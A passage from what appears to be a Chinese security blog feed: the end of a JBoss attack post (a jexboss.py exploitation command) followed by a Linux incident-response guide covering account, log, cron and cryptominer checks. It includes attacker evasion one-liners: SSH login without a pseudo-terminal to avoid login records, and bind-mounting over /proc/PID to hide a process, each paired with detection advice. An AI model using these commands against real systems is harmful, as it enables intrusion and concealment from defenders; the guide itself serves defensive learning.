src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114744.png" alt="1619580826442"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114745.png" alt="1619580855423"></p><p>这边写一个情况</p><p>本地测试之后 发现上传的文档 在这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114746.png" alt="1619580914678"></p><p>在这个目录下 有问题</p><h2 id="自动化渗透"><a href="#自动化渗透" class="headerlink" title="自动化渗透"></a>自动化渗透</h2><pre class="line-numbers language-none"><code class="language-none">sudo pip install -r requires.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114747.png" alt="1619568126765"></p><p>执行命令 拿jboss4举例</p><pre class="line-numbers language-none"><code class="language-none">python jexboss.py -host http://192.168.175.196:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行利用 就可以了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114748.png" alt="1619568214558"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Jboss是一个基于J2EE的<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81/114160">开放源代码</a>的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773">应用服务器</a>。</p><p>JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB  2.0和EJB3的规范。</p><p>但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用</p><p>希望此文对大家有帮助！</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jboss小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/2021/10/28/linux-ying-ji-xiang-ying/"/>
      <url>/2021/10/28/linux-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>身为一名网络安全从业者，很清楚安全总是相对的，再安全的服务器也有可能遭受到攻击，除了定期的备份数据外，还需定期对服务器进行安全检查，在实际的安全和运维工作中，应该在网络和系统被攻击之前，做好充分的准备，才能在网络被攻击时能够从容的应对。</p><h2 id="入侵排查流程"><a href="#入侵排查流程" class="headerlink" title="入侵排查流程"></a>入侵排查流程</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd "></a><code>/etc/passwd </code></h5><p>用户信息文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610781.png" alt="image-20211021133555029"></p><p>对应关系:</p><pre class="line-numbers language-none"><code class="language-none">用户名:密码:用户ID:组ID:用户说明:家目录:登陆之后shell <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:无密码只允许本机登陆，远程不允许登陆 </p><h5 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow "></a><code>/etc/shadow </code></h5><p>影子文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610783.png" alt="image-20211021133628507"></p><p>对应关系:</p><pre class="line-numbers language-none"><code class="language-none">用户名:加密密码:密码最后一次修改日期:两次密码的修改时间间隔:密码有效期:密码修改到期到的警告天数:密码过期之后的宽限天数:账号失效时间:保留 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="who"><a href="#who" class="headerlink" title="who"></a><code>who</code></h5><p>查看当前登录用户</p><p>注：tty本地登陆、pts远程登录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610784.png" alt="image-20211021133654545"></p><h5 id="w"><a href="#w" class="headerlink" title="w"></a><code>w</code></h5><p>查看系统信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610785.png" alt="image-20211021133723660"></p><h5 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a><code>uptime</code></h5><p>查看登陆多久、多少用户，负载</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610786.png" alt="image-20211021133750804"></p><h4 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h4><h5 id="1、查询特权用户特权用户-uid为0"><a href="#1、查询特权用户特权用户-uid为0" class="headerlink" title="1、查询特权用户特权用户(uid为0)"></a>1、查询特权用户特权用户(uid为0)</h5><pre class="line-numbers language-none"><code class="language-none">[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610787.png" alt="image-20211021133853541"></p><h5 id="2、查询可以远程登录的帐号信息"><a href="#2、查询可以远程登录的帐号信息" class="headerlink" title="2、查询可以远程登录的帐号信息"></a>2、查询可以远程登录的帐号信息</h5><pre class="line-numbers language-none"><code class="language-none">[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610788.png" alt="image-20211021133909453"></p><h5 id="3、其他帐号是否存在sudo权限。"><a href="#3、其他帐号是否存在sudo权限。" class="headerlink" title="3、其他帐号是否存在sudo权限。"></a>3、其他帐号是否存在sudo权限。</h5><p>注：如非管理需要，除root帐号外，普通帐号应删除sudo权限 </p><pre class="line-numbers language-none"><code class="language-none">[root@localhost ~]# more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4、禁用或删除多余及可疑的帐号"><a href="#4、禁用或删除多余及可疑的帐号" class="headerlink" title="4、禁用或删除多余及可疑的帐号"></a>4、禁用或删除多余及可疑的帐号</h5><pre class="line-numbers language-none"><code class="language-none">usermod -L user 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将/home目录下的user目录一并删除 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><h4 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h4><h5 id="1-查看帐号执行过的系统命令"><a href="#1-查看帐号执行过的系统命令" class="headerlink" title="1.查看帐号执行过的系统命令"></a>1.查看帐号执行过的系统命令</h5><p>通过.bash_history</p><pre class="line-numbers language-none"><code class="language-none">root的历史命令:histroy 打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610789.png" alt="image-20211021134034338"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610790.png" alt="image-20211021134020190"></p><h5 id="2-增加设置"><a href="#2-增加设置" class="headerlink" title="2.增加设置"></a>2.增加设置</h5><p>历史的命令增加登录的IP地址、执行命令时间等信息： </p><ul><li>保存1万条命令 </li></ul><pre class="line-numbers language-none"><code class="language-none">sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在<code>/etc/profile</code>的文件尾部添加如下行数配置信息： </li></ul><pre class="line-numbers language-none"><code class="language-none">####historyUSER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ "$USER_IP" = "" ] then USER_IP=`hostname` fiexport HISTTIMEFORMAT="%F %T $USER_IP `whoami` " shopt -s histappend export PROMPT_COMMAND="history -a" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610791.png" alt="image-20211021134150850"></p><ul><li>source /etc/profile让配置生效 </li></ul><p>生成效果： </p><pre class="line-numbers language-none"><code class="language-none">1 2021-010-22 19:45:39 192.168.1.1 root source /etc/profile <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3、历史操作命令的清除-问题"><a href="#3、历史操作命令的清除-问题" class="headerlink" title="3、历史操作命令的清除   问题"></a>3、历史操作命令的清除   问题</h5><p>使用命令：<code>history -c</code></p><p>但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</p><h4 id="入侵排查-1"><a href="#入侵排查-1" class="headerlink" title="入侵排查"></a>入侵排查</h4><p>进入用户目录下 </p><pre class="line-numbers language-none"><code class="language-none">cat /home/用户/.bash_history &gt;&gt; history.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="可疑端口"><a href="#可疑端口" class="headerlink" title="可疑端口"></a>可疑端口</h3><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><pre class="line-numbers language-none"><code class="language-none">netstat -antlp | more <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610792.png" alt="image-20211021134405494"></p><p>查看下pid所对应的进程文件路径， 运行</p><pre class="line-numbers language-none"><code class="language-none">ls -l /proc/$PID/exe或file /proc/$PID/exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="可疑进程"><a href="#可疑进程" class="headerlink" title="可疑进程"></a>可疑进程</h3><p>使用ps命令，分析进程</p><pre class="line-numbers language-none"><code class="language-none">ps aux | grep pid <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610793.png" alt="image-20211021134353675"></p><h3 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h3><h4 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="系统运行级别示意图："><a href="#系统运行级别示意图：" class="headerlink" title="系统运行级别示意图："></a>系统运行级别示意图：</h5><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610794.png" alt="image-20211021101935556"></p><h5 id="查看运行级别命令"><a href="#查看运行级别命令" class="headerlink" title="查看运行级别命令"></a>查看运行级别命令</h5><p>使用命令：<code>runlevel</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610795.png" alt="image-20211021134425196"></p><p>系统默认允许级别</p><pre class="line-numbers language-none"><code class="language-none">vi /etc/inittab id=3:initdefault 系统开机后直接进入哪个运行级别 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>开机启动配置文件</p><pre class="line-numbers language-none"><code class="language-none">/etc/rc.local /etc/rc.d/rc[0~6].d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，</p><p>然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可</p><pre class="line-numbers language-none"><code class="language-none">root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh对应关系sshd:具体服务的脚本文件S100ssh:软链接，S开头代表加载时自启动,如果是K开头的脚本文件，代表运行级别加载时需要关闭的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="入侵排查-2"><a href="#入侵排查-2" class="headerlink" title="入侵排查"></a>入侵排查</h4><p>查看启动项文件： </p><pre class="line-numbers language-none"><code class="language-none">more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><h4 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>利用crontab创建计划任务</p><p>基本命令</p><pre class="line-numbers language-none"><code class="language-none">crontab -l:列出某个用户cron服务的详细内容Tips:默认编写的crontab文件会保存在:/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r:删除每个用户cront任务(谨慎：删除所有的计划任务)crontab -e:使用编辑器编辑当前的crontab文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="anacron"><a href="#anacron" class="headerlink" title="anacron"></a>anacron</h5><p>利用anacron实现异步定时任务调度</p><p>使用案例,每天运行 /home/backup.sh脚本： </p><pre class="line-numbers language-none"><code class="language-none">vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><h4 id="入侵排查-3"><a href="#入侵排查-3" class="headerlink" title="入侵排查"></a>入侵排查</h4><p>重点关注以下目录中是否存在恶意脚本</p><pre class="line-numbers language-none"><code class="language-none">/etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tips:</p><pre class="line-numbers language-none"><code class="language-none">more /etc/cron.daily/* 查看目录下所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610796.png" alt="image-20211021134600371"></p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="基本使用-3"><a href="#基本使用-3" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h5><ul><li><p>第一种修改方法：</p><p>问题 chkconfig安装</p></li></ul><pre class="line-numbers language-none"><code class="language-none">chkconfig [--level 运行级别] [独立服务名] [on|off] chkconfig –level 2345 httpd on 开启自启动 chkconfig httpd on (默认level是2345)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>第二种修改方法：</li></ul><pre class="line-numbers language-none"><code class="language-none">修改/etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>第三种修改方法：</li></ul><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务</p><h4 id="入侵排查-4"><a href="#入侵排查-4" class="headerlink" title="入侵排查"></a>入侵排查</h4><h5 id="查询已安装的服务："><a href="#查询已安装的服务：" class="headerlink" title="查询已安装的服务："></a>查询已安装的服务：</h5><ul><li>RPM包安装的服务</li></ul><pre class="line-numbers language-none"><code class="language-none">chkconfig --list #查看服务自启动状态,可以看到所有的RPM包安装的服务 ps aux | grep crond#查看当前服务 系统在3与5级别下的启动项 中文环境 chkconfig --list | grep "3:启用\|5:启用" 英文环境 chkconfig --list | grep "3:on\|5:on" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>源码包安装的服务</li></ul><pre class="line-numbers language-none"><code class="language-none">查看服务安装位置,一般是在/user/local/ service httpd start 搜索/etc/rc.d/init.d/,查看是否存在 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><h4 id="基本使用-4"><a href="#基本使用-4" class="headerlink" title="基本使用"></a>基本使用</h4><p>日志默认存放位置：<code>/var/log/</code></p><p>查看日志配置情况：<code>vi /etc/rsyslog.conf</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610797.png" alt="image-20211021134731233"></p><h4 id="日志文件说明"><a href="#日志文件说明" class="headerlink" title="日志文件说明"></a>日志文件说明</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610798.png" alt="image-20211021104609295"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>日志默认存放位置：<code>/var/log/</code></p><p>查看日志配置情况：<code>vi /etc/rsyslog.conf</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610799.png" alt="image-20211024160400268"></p><h3 id="日志文件对应的说明"><a href="#日志文件对应的说明" class="headerlink" title="日志文件对应的说明"></a>日志文件对应的说明</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610800.png" alt="image-20211024160518386"></p><h3 id="var-log-secure"><a href="#var-log-secure" class="headerlink" title="/var/log/secure"></a><code>/var/log/secure</code></h3><pre class="line-numbers language-none"><code class="language-none">1、定位有多少IP在爆破主机的root帐号： grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort - nr | more 定位有哪些IP在爆破:grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\. (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c 爆破用户名字典是什么？ grep "Failed password" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP： grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001,GID=1001,home=/home/kali,shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep "useradd" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep "userdel" /var/log/secure 5、su切换用户:Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="var-log-yum-log"><a href="#var-log-yum-log" class="headerlink" title="/var/log/yum.log"></a><code>/var/log/yum.log</code></h3><p>软件安装升级卸载日志：</p><pre class="line-numbers language-none"><code class="language-none">yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="挖矿事件"><a href="#挖矿事件" class="headerlink" title="挖矿事件"></a>挖矿事件</h2><h3 id="1-获取异常进程pid"><a href="#1-获取异常进程pid" class="headerlink" title="1.获取异常进程pid"></a>1.获取异常进程pid</h3><h4 id="CPU占用"><a href="#CPU占用" class="headerlink" title="CPU占用"></a>CPU占用</h4><pre class="line-numbers language-none"><code class="language-none">top -c -o %CPU <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610801.png" alt="image-20211024152733519"></p><p>CPU占用前5的进程信息</p><pre class="line-numbers language-none"><code class="language-none">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610802.png" alt="image-20211024152756297"></p><h4 id="内存占用"><a href="#内存占用" class="headerlink" title="内存占用"></a>内存占用</h4><pre class="line-numbers language-none"><code class="language-none">top -c -o %MEM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610803.png" alt="image-20211024152812797"></p><p>内存占用前5的进程信息</p><pre class="line-numbers language-none"><code class="language-none">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610804.png" alt="image-20211024152853048"></p><h4 id="网络占用"><a href="#网络占用" class="headerlink" title="网络占用"></a>网络占用</h4><p>安装nethogs</p><pre class="line-numbers language-none"><code class="language-none">apt-get install nethogs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后以root权限运行nethogs即可</p><h3 id="2-寻找恶意文件样本"><a href="#2-寻找恶意文件样本" class="headerlink" title="2.寻找恶意文件样本"></a>2.寻找恶意文件样本</h3><h4 id="进程名字或者部分字符串获取pid"><a href="#进程名字或者部分字符串获取pid" class="headerlink" title="进程名字或者部分字符串获取pid"></a>进程名字或者部分字符串获取pid</h4><pre class="line-numbers language-none"><code class="language-none">pidof "name"ps -aux | grep "name"ps -ef | grep "name" | grep -v grep | awk '{print $2}'pgrep -f "name"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pid获取程序的详细信息"><a href="#pid获取程序的详细信息" class="headerlink" title="pid获取程序的详细信息"></a>pid获取程序的详细信息</h4><pre class="line-numbers language-none"><code class="language-none">lsof -p pidpwdx pid #获取该pid的进程启动的时候的目录，并不一定是恶意文件所在的路径，只是启动恶意文件的路径systemctl status pid #获取这个进程的 status信息cat /proc/pid/mapsls -al /proc/pid/exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pid查看由进程起的线程"><a href="#pid查看由进程起的线程" class="headerlink" title="pid查看由进程起的线程"></a>pid查看由进程起的线程</h4><pre class="line-numbers language-none"><code class="language-none">ps H -T -p pidps -Lf pidtop -H -p pid -H#-H:选项可以显示线程htop#较为全面的展示线程,默认未安装pstree -acU#推荐,全面展示进程与线程间的关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：SPID就是线程ID，而CMD栏则显示了线程名称</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110241610805.png" alt="image-20211024153325234"></p><h3 id="3-处理异常进程"><a href="#3-处理异常进程" class="headerlink" title="3.处理异常进程"></a>3.处理异常进程</h3><h4 id="恶意文件样本采样"><a href="#恶意文件样本采样" class="headerlink" title="恶意文件样本采样"></a>恶意文件样本采样</h4><pre class="line-numbers language-none"><code class="language-none">scp -P 4588 remote@www.xxx.com:/usr/local/a /home/kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：</p><p>-P：指定SSH端口<br>从远程服务器将a下载到本地的/home/kali</p><h4 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a>进程查杀</h4><p>进程有子进程</p><pre class="line-numbers language-none"><code class="language-none">ps ajfxsystemctl status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进程无子进程</p><pre class="line-numbers language-none"><code class="language-none">kill -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死</p><p>杀掉这个进程组</p><pre class="line-numbers language-none"><code class="language-none">kill -9 -pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>挖矿病毒为了保障挖矿程序的运行，通常会为挖矿程序设置守护进程，杀死守护进程与杀死普通进程并无区别</p><h4 id="线程查杀"><a href="#线程查杀" class="headerlink" title="线程查杀"></a>线程查杀</h4><p>很多木马病毒将恶意代码执行做到了线程级别，也就是说附到了现有正常业务的进程中，做一个线程，目前查杀一个进程中的线程风险比较大，<strong>极可能会把进程搞崩掉</strong>，需要与客户确认好再进行，杀死线程的方法和杀死进程一样</p><h4 id="pid查看由进程起的线程-1"><a href="#pid查看由进程起的线程-1" class="headerlink" title="pid查看由进程起的线程"></a>pid查看由进程起的线程</h4><pre class="line-numbers language-none"><code class="language-none">ps -T -p pidps -aLf pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="查看全部线程"><a href="#查看全部线程" class="headerlink" title="查看全部线程"></a>查看全部线程</h4><pre class="line-numbers language-none"><code class="language-none">ps -eLFa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-删除恶意文件"><a href="#4-删除恶意文件" class="headerlink" title="4.删除恶意文件"></a>4.删除恶意文件</h4><h4 id="通过进程pid以及-proc"><a href="#通过进程pid以及-proc" class="headerlink" title="通过进程pid以及/proc/"></a>通过进程pid以及<code>/proc/</code></h4><p>我们已经定位到了文件的具体位置，接下来就是删除恶意文件<br>查看文件占用</p><pre class="line-numbers language-none"><code class="language-none">lsof eval.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="a和i属性导致文件不可删除"><a href="#a和i属性导致文件不可删除" class="headerlink" title="a和i属性导致文件不可删除"></a>a和i属性导致文件不可删除</h4><p><code>a</code>属性文件：只能增加内容，不能修改之前的文件，不能删除文件</p><p><code>i</code>属性文件：内容不能改变，文件不能删除<br>可以使用 <code>chattr -a</code>和 <code>chattr -i</code></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="SSH隐蔽登录"><a href="#SSH隐蔽登录" class="headerlink" title="SSH隐蔽登录"></a>SSH隐蔽登录</h3><pre class="line-numbers language-none"><code class="language-none">ssh -T root@192.168.1.1 /usr/bin/bash -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>上面这条命令在日常渗透中，是红队的小伙伴进行登录操作会经常使用</p><p>因为这条命令它不分配伪终端的方式而不会被<code>w</code>和<code>lastlog</code>等命令记录</p><p>所以在某些时候，如果防守方在上机排查时，仅查看日志发现没有异常登录，却没有注意到是否存在异常网络连接时，就会判断为误报，给攻击者可乘之机</p><h4 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h4><p>只要连接SSH端口就一定存在记录</p><p>可以从</p><pre class="line-numbers language-none"><code class="language-none">lsof -i 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ss -nt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这两条命令结果中发现了连接服务器的恶意IP地址</p><h3 id="惯性密码"><a href="#惯性密码" class="headerlink" title="惯性密码"></a>惯性密码</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><pre class="line-numbers language-none"><code class="language-none">aaRedis63090329<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 像这个密码，不难猜测密码为前后缀固定格式，中间四位为本机端口号，然后重新组合登录，会有很大的风险</p><h4 id="处置"><a href="#处置" class="headerlink" title="处置"></a>处置</h4><p>密码复杂化和不可捉摸性</p><h3 id="pid查询失败"><a href="#pid查询失败" class="headerlink" title="pid查询失败"></a>pid查询失败</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>有些时候，我们无法通过top、ps命令查看进程pid</p><p>可能是攻击者</p><p>将<code>/proc/pid/</code>进行了隐藏</p><p>隐藏方法</p><pre class="line-numbers language-none"><code class="language-none">mkdir .hiddenmount -o bind .hidden /proc/PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="处置-1"><a href="#处置-1" class="headerlink" title="处置"></a>处置</h4><p>这个时候，我们可以查看挂载信息</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/$$/mountinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 